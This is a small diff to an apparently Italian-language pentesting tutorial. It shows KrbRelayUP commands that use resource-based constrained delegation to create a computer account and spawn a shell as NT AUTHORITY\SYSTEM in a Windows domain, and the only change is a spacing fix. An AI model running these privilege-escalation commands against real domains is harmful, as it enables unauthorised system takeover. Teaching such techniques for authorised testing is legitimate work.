@@ -177,7 +177,7 @@ PS C:\temp> KrbRelayUP.exe relay -Domain company.work -CreateNewComputerAccount 
 ➤ KrbRelayUP utilizzerà la primitiva di controllo appropriata per ottenere un ticket di servizio Kerberos e lo userà per creare un nuovo servizio in esecuzione come SYSTEM.
 
 ```
-PS C:\temp>KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -cn Pentesterhost$ -cp Welcome2022
+PS C:\temp> KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -cn Pentesterhost$ -cp Welcome2022
 ```
 
 ➤ Completato questi passaggi una shell nt authority/system comparirà
